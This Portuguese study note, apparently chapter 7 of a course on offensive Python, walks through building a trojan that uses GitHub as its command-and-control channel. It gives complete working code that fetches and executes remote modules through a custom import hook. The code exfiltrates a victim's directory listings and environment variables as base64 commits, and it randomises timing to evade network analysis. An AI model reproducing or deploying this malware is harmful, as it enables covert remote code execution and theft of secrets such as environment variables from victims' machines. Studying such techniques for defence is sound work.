# Capitulo 7 

Nesse capítulo, se inicia o processo de criação de um trojan ("cavalo de troia"), que nada mais é que um malware que se disfarça de um software comum.

## Técnica de comando e controle para o Github

A inspiração desse estudo é, basicamente, configurar um método de comunicação remota entre um trojan já instalado na vítima e o atacante. Isto é, de um ponto de vista geral, um hacker deve ser capaz de atualizar seu código instalado para que possa se adaptar às mudanças no computador da vítima, bem como se comunicar com o seu malware. ("Comando e controle")

Para isso, utilizaremos o Github, que, além de ter integração com o Python, criptografa o tráfego de commits usando o Secure Sockets Layer (SSL). Se você não tem uma conta no Github e está lendo este texto, algo está errado...

Finalmente, como utilizaremos um novo respositório para a criação do trojan. Ainda não sei se ele será público ou privado mas, por via das dúvidas aqui está o link: [Github](https://github.com/caioescorcio/git-trojan). Os códigos usados estarão nesse git, logo haverá um link entre este repositório e o repositório usado.

### Configurando uma conta Github

Nessa parte eu acharia melhor o uso do Git Bash caso se esteja em uma máquina Windows. Para instalá-lo siga: [Git Bash](https://git-scm.com/downloads/win).

Primeiramente, deveremos instalar a lib do Python para uso do Github. Execute no seu terminal:

```bash
pip install github3.py
```

Em seguida, crie no seu Github o repositório com um nome de preferência, para receber os códigos. Depois, em uma nova pasta (sem um repositório já instalado), use os seguintes comandos:

```bash
mkdir <NOME DO REPOSITORIO>
cd <NOME DO REPOSITORIO>
git init
mkdir modules
mkdir config
mkdir data
touch .gitignore
git add .
git commit -m "Adicionada estrutura do repo para o trojan"
git remote add origin https://github.com/<SEU USUARIO>/<NOME DO REPOSITORIO>.git
git push origin master
```

Isso criará uma série de arquivos que representarão a estrutura que usaremos no nosso trojan.

Nos arquivos criados:

- `config` armazena os arquivos de configuração do nosso trojan. Como cada trojan executará tarefas diferentes, é importante que eles tenham arquivos de configuração diferentes.
- `modules` contém os códigos modulares que o trojan deve capturar e, em seguida, executar. 
- `data` é onde o nosso trojan verificará os dados coletados

Será implementada uma técnica de importação de código para que o nosso trojan consiga usar bibliotecas diretamente de respositórios do Github, evitando a necessidade de recompilar o código do trojan toda vez que hajam novas funcionalidades/dependências.

O autor recomenda que sigamos as [instruções](https://docs.github.com/en/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-user-access-token-for-a-github-app) do próprio Github para criação de um token de utilização da API do site. Gere um token através do [link](https://github.com/settings/tokens) e coloque num arquivos `token.txt`. Não se esqueça de colocá-lo no `.gitignore` para evitar que as credenciais sejam commitadas.

### Criando módulos

Inicialmente, criaremos módulos simples para a utilização do nosso trojan.

Em `modules/dirlister.py`, adicionaremos, para listar os arquivos do diretório atual:

```py
import os

def run(**args):
    print("[*] No módulo dirlister.")
    files = os.listdir(".")
    return str(files)
```

Vale ressaltar que cada módulo deve possuir uma função `run()`, que recebe como variável um número arbitrário de argumentos, que ajuda na personalização dos arquivos de configuração.

Em `modules/environment.py`, adicione:

```py
import os

def run(**args):
    print("[*] No módulo environment.")
    return os.environ
```

Que recupera as variáveis de ambiente definidas na vítima.

Para commitar, podemos utilizar o próprio terminal do Git Bash com os seguintes comandos:

```bash
git add .
git commit -m "Adicionar novos módulos"
git push origin master
```

Temos dois módulos criados, mas devemos também adicioná-los ao nosso arquivo de configuração para que eles sejam rodados.

### Configurando o trojan

É necessário que, para que nosso trojan execute tarefas específicas, ele saiba que módulos utilizar. Para isso deveremos criar um jeito do trojan saber o que ele deve fazer: esperar, usar módulos, enviar dados, etc. e, além disso, ele deve ter um ID exclusivo para que possamos saber de onde os dados que ele enviar estão vindo ou que dados ele receberá.

Nosso trojan deve ser capaz de buscar no diretório `config` o arquivo `TROJANID.json`, um documento simples para que o convertamos em um dicionário Python para ele saber o que deve executar. Criaremos o arquivo `config/teste.json`, onde `teste` é o ID do nosso trojan:

```json
[
    {
        "module": "dirlister"
    },
    {
        "module": "environment"
    }
]
```

Por enquanto é apenas uma lista simples de módulos para serem excutados. Podemos adicionar outras funcionalidades, como tempo de execução, número de execuções, argumentos, etc. Commitaremos esse arquivo.

### Construindo um trojan com integração ao Github

Agora criaremos o arquivo `git_trojan.py` para usar a API do Github para executar de forma genérica nosso trojan:

```py
import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime
```

Esse código deve ter um tamanho não muito grande, mas isso é relativo, pois os binários de Python geralmente são instalados usando o `pyinstaller`, vide a [documentação](https://pyinstaller.org/en/stable/), ele tem cerca de 7 MB. O autor diz que devemos instalar esse binário na máquina vítima, mas não entendi muito bem o que ele quis dizer.

Ele também fala que, para criar botnets (uma série de trojans de vários implantes) seria bacana um código para gerar automaticamente os IDs, compilá-los, etc. Não construiremos uma botnet nesse estudo, fica a cargo da curiosidade.

No mesmo arquivo anterior, criaremos o passo de autenticação no Github:

```py
# Função de conexão com o Github
def github_connect():
    with open("token.txt") as f:
        token = f.read()    # busca o arquivo de token
    user = "caioescorcio"   # usuário 
    sess = github3.login(token=token)   # login do git
    return sess.repository(user, "git-trojan")  # retorna o respoitório desejado. No nosso caso é o do git-trojan

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content   # busca os conteúdos remotos de determinado repositório

class Trojan:   # classe Trojan, que configura os caminhos dos arquivos para o seu id e conecta ao github
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}'
        self.repo = github_connect()
```

Esse código básico, conecta ao Github para receber informações dos seus repositórios, bem como lê o conteúdo de `paths` específicos de cada repositório.

Em seguida, criaremos o leitor do arquivo de configuração e o de `run()` de módulos:

```py
# Método get_config() carrega o json do arquivo de configuração no repositório remoto, para que o Trojan saiba o que executar
def get_config(self):
    config_json = get_file_contents('config', self.config_file, self.repo) # busca no repo
    config = json.loads(base64.b64decode(config_json))  # decode do json
    
    for task in config: # busca as tasks
        if task['module'] not in sys.modules:   # sys.modules é o aglomerado de todas as libs do python na máquina
            exec("import %s" % task['module'])  # caso o módulo não esteja presente nas "libs-padrão", é importado para dentro do trojan
                                                # essa funcionalidade do exec coloca o módulo dentro do objeto Trojan, 
                                                # podendo ser executado pelo sistema, agora
    return config   # retorna "a configuração"

# Método module_runner() executa o módulo e armazena o seu output usando store_module_result()
def module_runner(self, module):
    result = sys.modules[module].run() # executa a função run() do módulo
    self.store_module_result(result)
    
# Método store_module_result() armazena o resultado por commit
def store_module_result(self, data):
    message = datetime.now().isoformat()    # grava a data de captura dos dados (mensagem do commit)
    remote_path = f'data/{self.id}/{message}.data'  # coloca um formato de path para commit
    bin_data = bytes('%r' % data, 'utf-8')  # pega os dados desejados em bytes
    self.repo.create_file(remote_path, message, base64.b64encode(bin_data)) # commita no respositório       
    
def run(self):
    while True:
        config = self.get_config()
        # executa várias threads para cada módulo
        for task in config:
            thread = threading.Thread(target=self.module_runner, 
                                        args= (task['module'], ))
            thread.start()
            time.sleep(random.randint(1, 10)) # aleatoriza o tempo de execução de cada thread
            
        time.sleep(random.randint(30*60, 30*60*60)) # aleatoriza o tempo de atualização de dados
        # Esses randons ajudam a dificultar recorrência de tempo na análise de rede
```

Agora temos um modo de se comunicar com um repositório remoto.

### Hackeando a funcionalidade import do Python

Nessa parte em sequência, os autores mencionam a seguinte situação: imaginemos que queremos importar uma biblioteca para nosso trojan mas ela não está instalada no computador da vítima (os métodos de instalação de libs remotas são difíceis). Outra, você quer utilizar as mesmas libs para todos os seus trojans na máquina vítima.

Com essa inspiração, criaremos o GitImporter, que, devido ao mecanismo de importação do Python, funciona para sanar essas pendências. Isso funciona pois o Python, quando não acha os módulos localmente, aceita classes de importação arbitrárias, possibilitando a recuperação de bibliotecas remotamente.

Para isso, devemos adicionar uma classe personalizada ao `sys.meta_path`, que é uma variável de lista de localizadores de importação (import finders). Ele permite que executemos códigos não presentes no dispositivo. Adicionaremos o seguinte código ao nosso trojan:

```py
# Essa é a classe que diremos ao sys.meta_path: "ela vai procurar, caso você não ache" 
class GitImporter:
    def __init__(self):
        self.current_module_code = ""   # string do código do módulo
        
    def find_module(self, name, path=None):
        print("[*] Tentando recuperar %s" % name)
        self.repo = github_connect()    # conexão com o git
        
        new_library = get_file_contents('modules', f'{name}.py', self.repo) # busca os arquivos no módulo remoto
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)    # se ele achar, retorna a si mesmo 
                                                                        # como um indicativo de "consegui achar a lib"
            return self
        
    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, 
                                               origin=self.repo.git_url) # realiza o import dinamico
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__) # executa o import do modulo
        sys.modules[spec.name] = new_module # retorna ao sys o módulo
        return new_module   
    
if __name__ == '__main__':
    sys.meta_path.append(GitImporter()) # na main, adiciona o import
    trojan = Trojan('teste')    # inicia o trojan
    trojan.run()    # roda-o
```


Pronto, agora testaremos o código.

### Explorando o código

Boa! Agora, para executar o trojan, coloque apenas o seguinte código-esqueleto no arquivo a ser executado:

```py
import base64
import importlib.util
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

def github_connect():
    with open("token.txt") as f:
        token = f.read().strip()
    user = "caioescorcio"
    sess = github3.login(token=token)
    return sess.repository(user, "git-trojan")

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}'
        self.repo = github_connect()
        
    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
                
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)
        
    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bin_data = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bin_data))        
        
    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner, 
                                          args= (task['module'], ))
                thread.start()
                time.sleep(random.randint(1, 10))
                
            time.sleep(random.randint(30*60, 30*60*60))
            
class GitImporter:
    def __init__(self):
        self.current_module_code = ""
        
    def find_module(self, name, path=None):
        print("[*] Tentando recuperar %s" % name)
        self.repo = github_connect()
        
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self
        
    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, 
                                               origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module
    
if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('teste')
    trojan.run()
```

Ao executá-lo, se tudo correr bem, teremos alguns commits no repositório selecionado do Github da forma `2025-01-06T18:25:32.012084.data` na pasta `data/ID`. Note que ele executará as tasks `dirlister` e `environment` e colocará os dados de forma encriptada em base64:

No que representaria o `dirlister.py`:
`IlsnZ2l0X3Ryb2phbi5weScsICd0b2tlbi50eHQnXSI=` = `"['git_trojan.py', 'token.txt']"`

Você pode customizar para ele executar quaisquer outros códigos abitrários em Python sem mesmo mexer na execução do arquivo, devido às rotinas de leitura. 
